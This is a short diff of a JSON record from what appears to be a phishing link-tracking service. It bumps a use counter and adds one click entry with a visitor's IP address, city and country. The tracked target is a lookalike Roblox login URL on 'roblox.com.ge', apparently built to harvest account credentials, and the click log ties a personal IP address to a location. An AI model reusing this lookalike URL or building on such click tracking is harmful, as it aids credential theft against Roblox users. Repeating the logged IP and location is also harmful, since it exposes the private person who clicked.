@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1610,
+    "useCount": 1611,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13048,6 +13048,14 @@
         "city": "Uzhcurrumi",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777517365609,
+        "ip": "171.225.192.50",
+        "country": "Vietnam",
+        "city": "Haiphong",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
